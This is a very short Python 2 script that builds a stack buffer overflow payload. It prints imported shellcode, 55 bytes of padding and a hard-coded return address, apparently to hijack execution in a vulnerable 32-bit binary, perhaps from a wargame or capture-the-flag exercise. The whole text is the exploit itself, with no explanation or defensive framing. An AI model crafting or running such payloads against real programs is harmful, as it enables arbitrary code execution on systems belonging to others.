from shellcode import shellcode
print shellcode+"a"*55+"\x0c"+"\x71"+"\xfe"+"\xbf";
